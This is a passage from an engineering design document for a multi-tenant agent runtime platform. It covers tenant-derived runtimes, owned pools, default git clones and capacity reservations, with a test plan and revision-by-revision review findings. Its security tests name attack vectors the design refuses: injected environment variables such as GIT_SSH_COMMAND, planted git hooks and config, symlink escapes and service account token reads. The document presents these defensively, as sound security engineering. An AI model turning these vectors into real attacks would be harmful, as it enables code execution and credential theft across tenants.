- §10.2: the permission matrix, the new permission, and **Runtime and pool scoping clarification**.
- §10.5 **`RuntimeUpgrade` State Machine**: owned pools.
- §10.6: runtime reach before selectors, and the `allow-all` text that names a tag no record carries.
- §10.7: which pools an experiment can name, and what its effects reach.
- §11.2: `maxOwnedPods` as a platform-held bound.
- §11.7: the new events.
- §12.3, §12.8, and §12.9: the tables, erasure, and classification.
- §13.2.6: an owned pool's profile comes from its template.
- §8.7: a child's exports refused on a target with no runtime supervisor. §5.1: `supportsWorkspaceFiles` reads false on an embedded runtime, which the RuntimeReconciler mirrors, so a parent is not told exports will be honored.
- §14.1 **Runtime workspace defaults.**: tenant-written commands get no exemption, rule 4 does not apply where the tenant view is wired, default clones compose as `gitClone` sources, and **Path collision rule** states that a plan path crossing a symbolic link fails the session. §14 gains `writeDefaultClones`, and §6.4 gains the warm clone volume. `session-derive-design.md` owns the changes to §7.1 **Derive restore semantics:** and §15.1 **Session Replay Semantics**.
- §15.1: the routes, the codes, the deletion rules for a runtime and a tenant, `retire`, and the removal of the `tenant-admin` clauses on `PUT` rows.
- §16: bounds, base-status, and reservation metrics, with label cardinality stated, and `TenantReservationUnmet`.
- §17.2: the label webhooks.
- §17.2: the split quota, the `PriorityClass`, and the taint on a reserved node pool.
- §17.6 and §17.8.2: the Helm values, the default for an absent `tenantAccess` on the seed, and preflight's sizing with `maxOwnedPodsTotal` and `reservedPods`.
- §24: `lenny-ctl` commands.

## Proposals and dependencies

| Label | Proposal | Contents |
| :-- | :-- | :-- |
| DR-1 | Shared-record boundary | Removes `tenant-admin` writes on platform-global runtimes and pools, including the permissions, reads grants on session, discovery, and delegation paths, limits experiments to a pool's single tenant, implements the seed's `tenantAccess`, reserves `--`, and limits names to 63 characters. Closes DF-1, DF-2, DF-9, DF-10, and DF-14, and the remainder of F-5.2.67 that EG-9's overlay does not cover. |
| DR-2 | Pods for derived runtimes | `podRuntimeRef` on the CRD and pool row, every `Runtime` read in the Sandbox controller, and the §5.1 text on fallback and `sessionPolicy`. It also covers a pool on a platform derived runtime. Closes the derived half of DF-3, DF-5, and DF-6, and DF-7 for platform-derived runtimes. |
| DR-3 | Setup command identity | Runs setup commands at the agent UID through the runtime supervisor on sidecar pods. Closes DF-4 for the adapter's identity. |
| DR-4 | Tenant runtime records | The table, tenant-view interface and the holders that change type, `ErrTenantScopedName`, grant, prefix, permission, routes, field rules, Helm values, erasure, and classification. Closes DF-13, the table half of DF-12, and DF-7 for tenant-derived runtimes. |
| DR-5 | Owned pools | The template copy and its propagation, `ownedOverlays`, `lenny.dev/served`, the bounds, the PoolScalingController clamp, tenant operations, and tenant suspension and deletion. |
| DR-12 | Repository folders | `gitClone.path` required and never `.`, the overlap refusals, `workingDirectory` with its start check and resume fallback, `setupCommands[].cwd`, and the runtime `cwd` from session start. |
| DR-9 | Default git clones | The field, the write checks, the composition order on every path, the refusal details, the write scope, and the guardrail values. |
| DR-11 | Warm clones | `warm`, `maxWarmCloneBytes`, the warm list carrier, `coveredStores`, the volume, the pre-session reach, the age limit, the backoff, and the fill limits. |
| DR-10 | Capacity reservation | The Helm values, allowance, `reservedPods`, warm target, split quota, `PriorityClass`, `reservedPlacement`, budget figure, reporting, and alert. |
| DR-6 | Base lifecycle | The live merge against base and grant, `baseStatus`, the outbox, retirement, emergency, and the deletion rule. Closes DF-8. |
| DR-7 | Oversight and records | The guardrail, posture, and events. |
| DR-8 | Interactions | Environment warnings, the experiment re-check on the final row, delegation resolution, and the refusal of exports onto an unsupervised target, which closes F-8.7.16. |

These land early, because a stored format, a wire contract, or a shipped enforcement point would otherwise need rework: the `--` reservation in DR-1, `podRuntimeRef` in DR-2, the required `gitClone.path` and `workingDirectory` in DR-12, and `lenny.dev/served` with `ownerTenantId` in EG-9. DR-1, DR-2, DR-3, and DR-12 stand on their own and fix today's tree, whether or not the rest lands.

| Proposal | Depends on | Why |
| :-- | :-- | :-- |
| DR-1 | None | It should land first, because it closes a Critical defect |
| DR-2 | None | |
| DR-3 | None | |
| DR-4 | DR-1, EG-9, and TS-3 | The name rule, the write path and gate model, and the fail-closed gate |
| DR-4 (tenant defaults step, files and commands) | DR-3 | Neither a tenant command nor a base command reading a tenant file can run at the adapter's UID |
| DR-5 | DR-2, DR-4, and EG-9 | The pod path, the records, and `ownerTenantId` with the label rule |
| DR-6 | DR-4 and DR-5 | The merge and pools it acts on |
| DR-9 | DR-3, DR-4, DR-5, the egress design's pod-side clone and slot `sizeLimit`, and SD-1's plan check function | A clone is code, it needs an owned pool's git path, and F-14.1.37 means no `gitClone` works in a deployed image today. A `required` pool also needs UG-2. |
| DR-11 | DR-9, draft 0111 as the egress design rewrites it, and the egress design's slot `sizeLimit` | The clone it warms, the store, slot repository, capture copy, and restore completion it reuses, and the second line under a checkout. Warm clones can land after DR-9 with no format change to the clone, because `warm` is additive. |
| DR-10 | DR-5 | The owned pool and its budget |
| DR-7 | DR-4, and SO-1 and SO-2, whichever lands second adding the case | The role and the record |
| DR-8 | DR-4, TS-1, and TS-3 | The checks on the final row |

Decision 15's route needs DR-1, DR-2, DR-4 with neither default flag, DR-5, and TS-1. It does not need DR-3. A platform-created derived runtime needs DR-2 alone, so decision 15 has an operator's route before the rest lands. No `EG-`, `TS-`, or `SO-` proposal depends on a DR proposal, apart from the requests above.

## Documentation

Each proposal carries the documentation for its own surface. Pages state behaviour with no section numbers, and they land after the specification text they describe.

| Page | Change |
| :-- | :-- |
| `operator-guide/tenant-derived-runtimes.md` (new) | Owns the grant, template pools, budgets, reservations and how to size them, retirement, emergency, capacity headroom, and the costs above. |
| `operator-guide/multi-tenancy.md` | Corrects what `runtime_tenant_access` does, removes tenant writes on shared records, and links the new page. |
| `getting-started/concepts.md`, **Derived runtimes** | Corrects the restrict-only statements, and states that a derived runtime needs a pool. |
| `runtime-author-guide/runtime-configuration.md` | States where setup commands run after DR-3, and which fields a tenant can set. |
| `api/admin.md`, the error reference, and `reference/configuration.md` | The routes, codes, and Helm values. |
| `operator-guide/lenny-ctl.md` | The new commands. |
| `reference/glossary.md` | Entries for tenant-derived runtime, owned pool, template pool, and derivation grant. |
| "Tenant configuration" in the `egress-and-git-design.md` chapter | How a tenant admin creates a derived runtime for an environment, that default files hold no secrets, how to choose a default clone's ref, and how to read a reservation's status. |

## Tests

Each proposal turns this list into tests with `// spec:` annotations at the tiers `test-coverage.md` maps. No test exists yet.

### Tier 0: static

- The schemas of the new routes and the CRD fields validate. The session-path holders compile with the tenant-view interface and no plain `Store`.

### Tier 1: unit

- Every row of the field tables: accepted, refused, and narrow, for each `sessionPolicy` limit. `oneSessionPerPod: true` on a concurrent, a recycling, and a `keep` template gives one session with no recycling and no acknowledgment, and a template widening does not reach it. `false` copies the template, with `allowCrossTenantReuse` reading false. `maxConcurrentSessions` at any value, an acknowledgment, and each `recycle` field are refused. A `PUT` omitting `oneSessionPerPod` leaves it set, and a `PUT` setting `false` on a row holding `true` is refused, with no session placed on an occupied or served pod. A `true` row passes pool validation on a `keep` and an `in-place` template. An owned limit stays the lower of the two values across template writes in both directions. A `false` row is non-compliant with `reusedPods` on a template that reuses no pods, and a template widening leaves a `true` row unchanged. A clone write on a `true` row over a reusing template passes with the field omitted. A zero limit resolves to its default before the comparison.
- Name and prefix grammar, including `a--b--x` and a trailing `-`, prefix mismatch, 63-character limit, platform refusal of `--`, and `ErrTenantScopedName` from `Store.Get`.
- The merge against base and grant, for each row of "Base changes", including an emptied set.
- `ExperimentVariantSource`: effects reach an owned pool or a sole grantee's pool, a shared pool is untouched, and one tenant's malformed set leaves other tenants' variants applied.
- `AdmitTenantPin` and `markPinnedIdle` across owned and shared pools, served and unserved, recycling and not.
- T at the bound: a claim and a write that reach it pass, and those that pass it are refused, a lowering always passes, warming and `sdk_connecting` pods are counted once, `terminated` Sandboxes are not counted, a tenant's pods on shared pools are not counted, and a `ClaimSlot` on an occupied pod leaves T unchanged. T holds across several pools, with and without reservations. The WarmPoolController creates no Sandbox at the owner's bound, after a lowering followed by a raise, after a `DELETE` with pods draining, and for a reservation's replacement under short sessions. The clamp on the PoolScalingController formula and `initialMinWarm`.
- A tenant schema with a `file:` `$ref`, a non-compiling schema, and an oversized schema are refused at write.
- Default clones: each write check refuses, including an uncovered host with a full commit, a write scope, an `auth`-less repository under a pool prefix, `submodules`, `path: .`, a `.git` component in any case, overlapping paths, and a URL with userinfo. `ComposeInto` places clones after files and ahead of client sources.
- `plan.Compute` given a floor above `warmCount` creates up to the floor, `ForceZeroMinWarm` renders `spec.reservedPods` as 0, and a `scaleToZero` window leaves it. The warm target at `active` below, equal to, and above `reservedPods`, with `draining` and `failed` not counted, a `scaleToZero` window not lowering it, and `warm_stop_reasons` overriding it. T with a reservation: a claim within it passes at the bound even with pods draining, a `reservedPods` write that takes T past the bound is refused, and pods stay at `reservedPods + warmCount` after those claims.

### Tier 2: component

- The PoolScalingController renders `podRuntimeRef` and the owner, the controller creates a pod from the base's `Runtime` resource, a missing base fails closed, and an SDK-warm base warms its owned pool as SDK-warm.
- The webhook admits the owner label at creation and refuses every other tenant change.
- The chart renders the split with `lenny-agent-storage-quota` unscoped, and it applies on a cluster. `lenny-agent-quota` admits a pod with no priority class under its `NotIn` scope.
- The WarmPoolController marks Sandboxes reserved up to `reservedPods` and no further, a marked Sandbox's pod carries `lenny-reserved` and `reservedPlacement`, a replacement after a reserved pod ends is marked, unmarked idle pods drain first, and a podless unmarked Sandbox is replaced by a marked one while marks fall short. With `reservations.enabled` false, stored floors do not apply and no pod is marked.

### Tier 3: contract

- The route bodies refuse unknown fields, the error codes match §15.1, and `GET /v1/admin/derived-runtimes/{name}` reports `baseStatus`.
- `CH-SUPERVISE` carries a setup run with the DR-3 outcome reports.
- `runtimeDefault` survives the stored plan, the schema, the mapping to `WorkspaceSource`, and the adapter's decode, and a client's plan setting it is refused.

### Tier 4: integration

- Row-level security: a query with no context sees no row, tenant `globex`'s context sees none of `acme`'s, and `InAllTenants` sees both.
- A create writes the runtime and pool together, and a failed pool write leaves no runtime.
- Concurrent creates cannot exceed `maxRuntimes` or `maxOwnedPods`, a claim at the bound answers `QUOTA_EXCEEDED`, and a grant write cannot push the sum past `maxOwnedPodsTotal`.
- A template write copies to owned pools and bumps each generation, a flag-lowering write succeeds and stops an owned overlay's extension, a base write succeeds with incompatible derived runtimes present, and retirement moves through its states.
- Each session surface refuses a `--` name it cannot resolve, and `setupCommandPolicy.shell: false` reaches the adapter for a tenant-derived runtime.
- A platform `PUT` and `warm-count` on an owned pool succeed. A delegation policy's deletion guard sees its own tenant's reference, and another tenant's reference neither blocks the delete nor appears in the answer.
- A grant entry's `retireAt` moves its runtimes through retirement, an emergency write takes effect at once, and `DELETE .../tenant-access/{tenantId}` answers `409` while the entry is live. With `enabled` false, a narrowing grant write passes and a raise is refused.
- A default clone passes through the auth binding check, the `required` check, and the commit pin on create, create-and-start, finalize, and a delegated child, and a create with no plan refuses before any claim.
- A `gitClone` with no `path` or with `path: .` answers `WORKSPACE_PLAN_INVALID`, two overlapping clones are refused, and a client clone meeting a default clone is refused with no URL in the details. A file inside a clone's folder follows the collision rule. A derive refuses before the claim.
- A session with `workingDirectory` starts its runtime there and runs its setup commands there, a command's `cwd` overrides it, and the runtime default applies when the plan omits it. A missing folder, a file, and a symbolic link each fail the start with `WORKSPACE_WORKING_DIRECTORY_INVALID`, and on a resume the same cases start in `current/` with `workspace.working_directory_fallback`.
- Each `write` value on create, finalize, and a delegated child: `clientOptIn` with and without the flag, `always` with no plan, a read-only parent with a child under `always`, and a user with read and no write. 
- A warm pod reports ready only after its fill. A session binds with a store at the same commit, an older commit, and no store. A pod holding a store outside `coveredStores` is refused at an idle acquisition and on `ClaimSlot`'s second pass, and a pod created under an earlier list that holds no such store is claimed. Idle pods holding a store off the rendered list drain, and the age drain continues while fills fail. A `write` clone on an owned pool that reuses pods is refused, a clone under a `required` pool holds the policy too, a `warm` clone on such a pool answers with a `Warning`, its store is fetched once and each session checks out its own tree, a new session on a running pod can read a removed repository's store until the pod retires, a template raise does not reach a pool with `oneSessionPerPod` in either order against a concurrent `PUT`, and removing the clone leaves the field set. A restore onto a pod with no store completes with a shallow fetch, completes a repository whose pinned commit was amended when its history fits, and fails when it does not. A resume onto a pod holding a clone added after bind claims for a user who passes the check. A Pending pod at the quota neither stops the age drain nor uses the fill limit, and a loop of writes with a bad URL stays in backoff. A fill past `warmCloneBytes` fails, repeated failures back off, and a grant past `totalBytes` is refused. A resume after a clone was added runs the check and refuses a user with no access. A tree above `workspaceSizeLimitBytes` or `adapter.maxCloneTreeEntries` is refused before checkout, including from a commit the store holds, a tree of repeated subtrees and a tree of empty files stop the listing early, and two clones cannot sum past the limit. `session-derive-design.md` lists the derive cases.
- A grant write cannot push allowances past `totalPods`, counting live marked pods above an allowance. A lowered allowance or `maxOwnedPods` lowers `reservedPods`.
- A `DELETE` with live sessions changes nothing. Suspension drains owned pools, and resuming restores them. Tenant deletion and erasure remove the table, grant, and pools, and a consumed prefix stays refused.

### Tier 5: end to end on Kind

- A seeded install with no `tenantAccess` starts a session on its seeded runtime, and the embedded stack starts one on its CRD-only pool.
- Decision 15's scenario: a concurrent base, an owned one-session pool, and a session with E's full policy.
- With the general quota full, a reserved pod starts and a general pod is refused at quota admission. With nodes full and no dedicated pool, a reserved pod stays pending and no other pod is evicted.
- Warm pods stay in inventory on an owned non-recycling pool, a served pod drains, and a recycling owned pool reuses a pod for its owner within the reserved hold and drains it afterwards. A non-empty `warm_stop_reasons` drains served idle pods.

### Tier 6: end to end on cloud

- Materialization on a gVisor pod opens paths under `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS` and refuses a link.

### Tier 7: load

- Many concurrent creates and session starts across tenants, with the lock on the grant row under race detection.

### Tier 8: chaos

- A failed read of the tenant table fails a session create closed. A failed scan does not fail a platform base write, and its outbox row retries until `runtime.base_changed` goes out.

### Tier 9: security

- DF-1: a `tenant-admin` holding a grant, and a custom role naming either permission, gets `403` on each field of the runtime and pool `PUT`, and on `drain`. A custom role write naming either permission is refused.
- DF-9: a `tenant-admin` naming a shared pool or another tenant's pool as a variant gets the unknown-pool answer on `POST` and `PUT`, a `variant.Runtime` it cannot reach is refused, a `PATCH` on a `platform-admin`'s experiment on a platform pool answers `403`, and the controller leaves that pool's warm count and `SandboxWarmPool` unchanged.
- DF-2: a tenant with no grant cannot create on, discover, or delegate to a platform runtime.
- Each surface answers identically for another tenant's name and for an absent one: admin reads, `GET /v1/runtimes`, metadata, `/v1/models`, session create, delegate, experiment write, and `pool` pin.
- DF-4, on a one-session pod: a setup command's process runs at the agent UID, and cannot read the service account token or write the credential volume.
- A default command outside the base's allowlist, or under a policy with `shell: true`, is refused at write and at bind. A tenant file on a path a base file holds is refused, and a tenant default on a base with no supervisor is refused.
- `allowSetupCommands` or `allowWorkspaceFiles` set false makes a runtime holding that default refuse new sessions.
- A tenant-set variable outside the chart's allowlist, such as `NODE_OPTIONS` or `GIT_SSH_COMMAND`, is refused on an owned pool, whatever the copied flag says.
- A delegation with exports onto a target with no supervisor is refused, including when an experiment routes it there after the export step, and one with no exports passes.
- A `--` name from another tenant creates no admission rate-limit entry for its pool, and `verbatimClientFiles: forbid` refuses a default file.
- Revoking access after an experiment's write refuses its sessions and delegated children on the final row, for a runtime with no `--`. A tenant-admin's `PUT` on an experiment naming a platform pool answers `403`.
- A flag-lowering write emits `runtime.base_changed` to a tenant with an overlay and no grant. A tenant `PUT` does not clear `warm_stop_reasons`.
- A pod of an owned pool cannot be claimed for another tenant, even when the gateway's first layer is skipped.
- A restored symbolic link chain, and a single link an agent wrote in the live tree, fail materialization for an `inlineFile`, `uploadFile`, clone, and move, and nothing is written outside the slot.
- A user with no read access on a `required` pool is refused on a default clone, the answer omits the repository name, no `ls-refs` runs, and no App token is minted. A `.git/config`, `commondir`, or hook already in a clone's target, including from a restored snapshot, runs nothing at the adapter's UID and does not survive the move. A default-clone refusal on an `off` pool for a repository made private carries no URL. A `floatingCloneRefs` forbid suspends a runtime with a branch ref. `verbatimClientFiles: forbid` refuses a default clone. An experiment's `variant.Runtime` brings its clones under the same checks.
- An unbound owned pod reads its warm list and nothing else, and gets no write token. An agent cannot write a store from the runtime container. A commit the store holds is refused at bind for a user who lacks access, with no pod claimed. `write: always` with a pattern outside the namespace is refused at write, as is `always` under `prAuthoring: user`, and a push to the default branch is refused by `netagent`. A planted `lenny.gitStoreUrl` causes no fetch of that URL. `writableDefaultClones` and `alwaysWritableClones` suspend the runtimes they match. A kept tree's planted `.git/config`, hook, and alternates run nothing at the adapter's UID.
- A tenant with no allowance cannot set `reservedPods`, and no tenant write changes a Helm total or `reservedPlacement`.
- An SO-2 forbid refuses a write, suspends existing runtimes, and a removal waits out the delay.

### Tier 10: conformance

- Reference runtimes run setup commands from the runtime image after DR-3.

### Tier 11: documentation

- The page's examples validate against the schemas and the chart, and each error code resolves.

## Review of revision 1

An independent review read revision 1. Each finding was checked against the text and the tree. No finding was rejected outright, and the "Result" column states where the fix differs from the one proposed.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| H1, experiments drain shared pools | Holds. Fix changed. | `ListPoolConfigs`, `ResolveVariantRoles`, and the routes read as stated. "Delete" means the `SandboxWarmPool`, because the template and the row remain. An owned-only rule would end experiments on every deployment with no grant, against R8, because `tenant-admin` cannot create a pool. The rule is a pool's single tenant, with `tenant-admin` writes limited to owned pools, and it moves to DR-1 because the defect exists today. |
| H2, a missed site does not fail closed | Holds. | Applied, and the lint is replaced by the type change. `messages.go` was not traced for its not-found branch, and the type change covers it either way. |
| H3, default files are code | Holds. Fix widened. | `allowWorkspaceFiles` and refusal of a base path applied. The proposed refusal on a supervisor-less base with setup commands becomes refusal on any supervisor-less base, because an embedded runtime reading a tenant file shares the adapter's identity. This is one rule in place of a conditional. |
| M1, an overlay blocks a template write | Holds. | Applied for owned pools. An overlay on the template itself keeps EG-9's refusal, which is recorded as a residual. |
| M2, "no new surface" is false | Holds. | `ownedOverlays` applied, and the deny rule requested. |
| M3, custom roles keep DF-1 open | Holds. Fix narrowed. | Both permissions leave `RolePermissions(RoleTenantAdmin)`, which is the ceiling. The second list is `AllPermissions()`, which `platform-admin` needs, so it stays. |
| M4, R5 is not met | Holds. Fix smaller. | `maxOwnedPods` replaces `maxWarmPods` and the `max_concurrent_sessions` prerequisite. With the sum of grants at or below the total, only grant writes take the global lock, and pool writes need none. R5 is reworded. |
| M5, grant changes have no effect | Holds. | Applied through the rows in "Base changes". |
| M6, an allowlist under a shell does not bound | Holds. | Applied. |
| Minor 1, `podRuntimeRef` scope | Holds. | DF-3's closure narrowed, and the grant write checks the `Runtime` resource. |
| Minor 2, `resolveSDKWarm` | Holds. | Applied. |
| Minor 3, admin readers | Holds. | `validatePoolUpdate` reads the runtime unconditionally, so `PUT` and `warm-count` answer `400`. Applied, and `runtimeRestartable` added. |
| Minor 4, the DF-4 test and claim | Holds. | §13.1 states the concurrent-pod read. Test scoped, and DR-3's claim limited. |
| Minor 5, prefix grammar | Holds. Fix widened. | A trailing `-` also collides: prefix `a-` with suffix `x`, and prefix `a` with suffix `-x`, both give `a---x`. |
| Minor 6, erasure frees a prefix | Holds. | `consumed_name_prefixes` added. |
| Minor 7, template retirement and `DELETE` order | Holds. | A template is held by its grant entries and retires through a grant write, which needs no new mechanism. `DELETE` checks first, and a tenant `drain` route is added. |
| Minor 8, a failed scan loses the event | Holds. | Outbox row added. |
| Minor 9, tenant suspension and deletion | Holds. | Rules added, reusing `ForceZeroMinWarm`. |
| Minor 10, the owner on `SandboxTemplate` | Holds. | Added. |
| DF-4 rating, DR-3's limit, and the false comments | Hold. | `setup.go` and `pkg/embedded/stack/runtimes.go` say what was reported. Recorded in DF-2 and DF-4. |

## Review of revision 2

An independent review read revision 2. Each finding was checked against the text and the tree. No finding was rejected outright, and the "Result" column states where the fix differs from the one proposed.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| M1, the policy guard crosses tenants | Holds. Fix narrowed. | `delegationPolicyRuntimeDependents` and the route read as stated. The guard takes the policy's tenant and reads the tenant view, which is granted platform rows plus that tenant's rows. Reading all platform rows, as proposed, would still let an ungranted platform runtime block a delete and disclose its name, so that is filed as DF-13. |
| M2, `maxOwnedPods` does not bound | Holds. | Applied as proposed. |
| M3, a granted tenant can block a template write | Holds. | Applied, the residual removed, and the egress request changed. |
| Minor 1, `runtimeOptionsSchema` | Holds. Fix widened. | `Loaders` in `jsonschema/v5` v5.3.1 holds `file`, and `validateAgainstSchema` returns no error on a compile failure. `$schema` and `$id` are refused as well, because each can change what gets loaded. |
| Minor 2, tenant-reachable list calls | Holds. Fix widened. | `validatePoolProxyDialect` lists runtimes in the same way and is added. |
| Minor 3, `checkVariantIsolation` | Holds. | Applied. |
| Minor 4, `PATCH` | Holds. | Applied. It also corrects DR-1's claim that `PATCH` names a pool. |
| Minor 5, DF-9's routing evidence | Holds. | Corrected, and `variant.Runtime` is bounded at write. DF-9's rating stands, because it rests on the controller's effects. With `variant.Runtime` alone, a `tenant-admin` keeps a working experiment before DR-5, which lowers decision 13's cost. |
| Minor 6, per-tenant retirement has no carrier | Holds. Fix smaller. | `retireAt` on the grant entry carries it, and the emergency form uses the same `PUT`. `DELETE .../tenant-access/{tenantId}` answers `409` while an entry is live, in place of a new route form and a date column on the access table. |
| Minor 7, `enabled: false` | Holds. | Applied. |
| Minor 8, prefix reassignment | Holds. | Applied. |
| Minor 9, `clientProfile` denylist | Holds. | Allowlist applied, and the request changed. |
| Minor 10, `verbatimClientFiles` | Holds in one direction. | `verbatimClientFiles: forbid` now forbids `workspaceFiles`. The reverse was not applied, because a forbid on default files says nothing about the client config files `netagent` writes. |
| Minor 11, `type` and `deploymentModel` | Holds. Fix smaller. | `applyCRDFields` mirrors no `deploymentModel`. The RuntimeReconciler mirrors it, so a resolve needs no read of the `Runtime` resource. |
| Minor 12, commands re-run on rebuild | Holds. | §7.3 step 3e says so. Recorded as a residual, because filtering needs a per-command source on the stored plan. The false sentence is removed. |
| Minor 13, rate-limit order, `bootstrapMinWarm`, and the recycling test | Holds. | `requireAdmissionRateLimit` runs first in `create.go`, so the check moves ahead of it. `bootstrapMinWarm` is refused, and the recycling test and its rule state the reserved hold. |

## Review of revision 3

An independent review read revision 3. Each finding was checked against the text and the tree. No finding was rejected outright, and the "Result" column states where the fix differs from the one proposed.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| M1, the count reads the wrong source | Holds. | `derivePodStates`, `upsertSQL`, and `syncMirror` read as stated. The Sandbox list is the source, so no lag bound is needed. |
| M2, `variant.Runtime` is checked only at write | Holds. Fix widened. | `routeExperiment` runs before `enforceSetupCommandPolicy`, and `ResolvePool` reads no runtime store. The refusal covers a plain create as well as a rewrite, because a create on an ungranted name would otherwise continue, which leaves DF-2 open. §14.1 rule 4 therefore ends where the view is wired. |
| M3, an overlay rule with no notice | Holds. | Applied. |
| Minor 1, `<=` against `<` | Holds. | The write is refused at a sum equal to the bound, and `ClaimSlot` on an occupied pod is exempt. |
| Minors 2 and 3, dates and `409` | Holds. | Applied, with DP9's exception stated and the template `DELETE` included in it. |
| Minor 4, per-tenant `force` | Holds. | Applied. |
| Minor 5, `PUT` then `PATCH` | Holds. | Applied. |
| Minor 6, the finalizer | Holds. | Recorded as a residual, because holding the finalizer needs the reconciler to read tenant rows. |
| Minor 7, overlay gaps | Holds. Fix changed. | One sentence covers the drop, and `egressProfile` is added. EG-9 fixes the first group at pod creation. `warmUp` is read per decision, so it stops at the next decision instead of at a pod roll. |
| Minor 8, normalization and `Registered` | Holds. | `mirror` and `runsSupervisor` read as stated. The RuntimeReconciler records the condition in `registered`, so a resolve still reads only the row. |
| Minor 9, `enabled: false` | Holds. | `POST` is refused, and the sentence stands. |
| Minor 10, who drains | Holds. Fix smaller. | `warm_stop_reasons` replaces `owner_suspended` as the one column, read through the existing `ForceZeroMinWarm`. Reasons keep a tenant resume from clearing a retirement. `suspended_by` is added to the stored formats. |

## Review of revision 4

An independent review read revision 4. Each finding was checked against the text and the tree. No finding was rejected.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| M1, the refusal stops a fresh install | Holds. Fix changed. | `BootstrapRequest` and the handlers read as stated. §17.6 already specifies `tenantAccess` on seeded runtimes and pools, so DR-1 implements that rather than adding a list, and DF-14 records the gap. An absent value grants a sole seeded tenant and no one otherwise, because a default to every seeded tenant would over-grant on a multi-tenant seed. The unpinned rule is applied as proposed. |
| M2, `terminated` exhausts the budget | Holds. | `plan.Compute` and the state table read as stated. `failed` leaves through `draining`, so counting it does not leak. |
| Minor 1, `MaxWarm` | Holds. | `pinnedOverBound` uses `MaxWarm` less the target. Applied. |
| Minor 2, no pod roll | Holds. | Pending reported, recorded as a residual rather than a new drain, and the `egressProfile` case stated. |
| Minor 3, DP9 | Holds. | Applied, with the emergency retirement as the way past it. |
| Minor 4, clearing `suspended_by` | Holds. | A compliant `PUT` clears it, as SO-2's table states for a restored preset. |
| Minor 5, terminal retirement | Holds. | Applied. A cancel remains possible before the date. |

## Review of revision 5

A stop check on revision 5 found no Critical, High, or Major issue in this document. It raised the Minors below, each checked against the text and the tree. None was rejected.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| 1, a seed naming no tenant | Holds. | Migration `0053` inserts `default`. Applied. |
| 2, `helm upgrade` undoes a revocation | Holds. | `bootstrap-job.yaml` runs post-install and post-upgrade. The default applies on create alone, and `--force-update` reapplies only a list. |
| 3, the grant check at every `ResolvePool` | Holds. | Those sites call `ResolvePool` with `row.Pool`. The check is limited to the points that claim a pod. |
| 4, soft-deleted pools | Holds, with one correction. | `PoolPolicy`'s comment says `found` is false for a soft-deleted pool, and the code does not do that: both stores' `Get` return the row and it adds no check. The fix stands, because the rule must not depend on that comment. |
| 5, a re-issued entry | Holds. | Applied. |
| 6, R6 and DP9 | Holds. | Applied. |

## Review of DR-9 and DR-10

An independent review read revision 8 and found no path across tenants. Each finding below was checked against the text and the tree. None was rejected, and the "Result" column states where the fix differs from the one proposed. The reviewer's statements about Kubernetes behaviour come from its knowledge of upstream and were not run.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| High, a stale target defeats the floor | Holds. | `defaultSyncInterval` is 30 seconds, and `plan.Compute` counts a warming pod and drains only idle ones. The target moves to the WarmPoolController, with the two rules under "Which pods are reserved". |
| High, the quota runs out early | Holds. Fix changed. | `applyResources` stamps every container. The reserved quota limits `pods` alone, so a sizing error cannot refuse a reserved pod. |
| High, a raised priority changes eviction | Holds. | The class value is 0. |
| High, `.git` in a clone's target | Holds. | `validatePath` has no such check. Refused for defaults, and the egress design now requires a new directory with hooks and repository configuration ignored. |
| Major, `auth`-less clones | Holds. | `checkGitCloneAuthBindings` skips them. Checks now key on the pool prefix. |
| Major, refusals name the repository | Holds. | `writeRefResolveError` returns `url`. A separate writer applies, and the pinned-commit failure is stated. |
| Major, switching off breaks pods | Holds. | The controller reads the same value, so stored floors stop applying. |
| Major, the floor ignores other paths | Holds. | The order and the `active` definition are stated. |
| Major, lowering `maxOwnedPods` | Holds. | Allowances are bounded across the grant and lowered first. |
| Major, the marking race and overrun | Holds. | "No race" is withdrawn, and grant writes count overrun. |
| Major, placement and namespaces | Holds. Fix narrowed. | Reservations stay in the one namespace the controller manages and leave Kata out. The field is renamed. |
| Minors, wording, derive and replay, unsupported pods, and the other documents | Hold. | Applied. |

A stop check then read revision 9. It found no Critical or High issue and no path across tenants. Each of its Major findings was checked against the tree, and revision 10 applies them.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, the floor is clamped and a pause cannot override it | Holds. | `warmTarget` clamps to `MaxWarm`, and `resolveWarm` writes the same value for both zero paths. The target is passed as both values, and `spec.reservedPods` carries the override. |
| Major, a reserved pod can fail the budget | Holds. | The exemption now reads `claimed` and `reserved` alone, and a `reservedPods` write uses a non-strict rule. |
| Major, the derive and replay row | Holds. | Those rows set no `WorkspacePlan`. The row is rewritten, and a default clone replaces its path over a restored tree. |
| Major, the move merges `.git` | Holds. Introduced by revision 9's fix. | §14.1's rule is per path. `.git` is replaced as a unit, and all adapter git work comes before the move. |
| Minors: deleting a stuck Sandbox, checks at bind, error text, the disable switch, `spec.minWarm` readers, and preflight's missing source | Hold. | Applied. Preflight no longer claims a check it has no source for. |

A narrow stop check then read revision 10. It found no Critical or High issue and no path across tenants, and revision 11 applies its Major findings.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, the exemption breaks `maxOwnedPods` | Holds. Introduced by revision 10's fix. | The worst case is `reservedPods + warmCount`, and the write charge now covers it. |
| Major, whole-path replacement has no carrier | Holds. | `replacePath` is added, with §7.1 and §14.1 listed. |
| Major, the move can follow a planted link | Holds. Exists today for other writers. | `extractSymlink` and `writeInlineFile` read as stated. All materializer paths use `openat2`, and DF-15 is filed. No chain was run. |
| Major, the quota split cannot install | Holds. | Upstream's `IsResourceQuotaScopeValidForResource` refuses ephemeral storage under this scope. Storage moves to an unscoped quota, with the residual stated. Nothing was applied to a cluster. |
| Minors: the target's source, the `drain` route, deleting a warming Sandbox, `undoDerivedWrites`, and the lowering rule | Hold. | Applied. |

A further stop check read revision 11. It found no Critical or High issue, and revision 12 applies what follows.

| Finding | Result | Check and outcome |
| :-- | :-- | :-- |
| Major, the claim check fails across pools | Holds. Fix wider. | This is the third budget finding in a row, each from a rule added to the last. Revision 12 removes the exemption and the separate write and claim rules, and one figure, T, governs both. The worked examples were recomputed by hand. |
| Major, `replacePath` stops at the stored plan | Holds. | `WorkspaceSource` has no such field, and the mapping is field by field. All carriers are listed, with tests. |
